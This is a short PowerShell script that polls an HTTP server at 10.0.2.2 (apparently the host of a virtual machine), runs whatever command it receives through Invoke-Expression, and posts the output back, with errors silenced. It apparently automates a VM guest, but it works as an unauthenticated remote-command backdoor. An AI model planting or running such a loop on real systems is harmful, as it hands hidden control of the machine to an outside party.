$ErrorActionPreference = 'SilentlyContinue'
$base = 'http://10.0.2.2:8765'
while ($true) {
  try {
    $r = Invoke-WebRequest -UseBasicParsing -Uri "$base/next" -TimeoutSec 20
    if ($r.StatusCode -eq 200 -and $r.Content) {
      $j = $r.Content | ConvertFrom-Json
      $out = try { Invoke-Expression $j.cmd 2>&1 | Out-String -Width 250 } catch { $_ | Out-String }
      Invoke-WebRequest -UseBasicParsing -Uri "$base/result/$($j.id)" -Method Post -Body ([Text.Encoding]::UTF8.GetBytes($out)) -TimeoutSec 60 | Out-Null
    }
  } catch {}
  Start-Sleep -Seconds 3
}
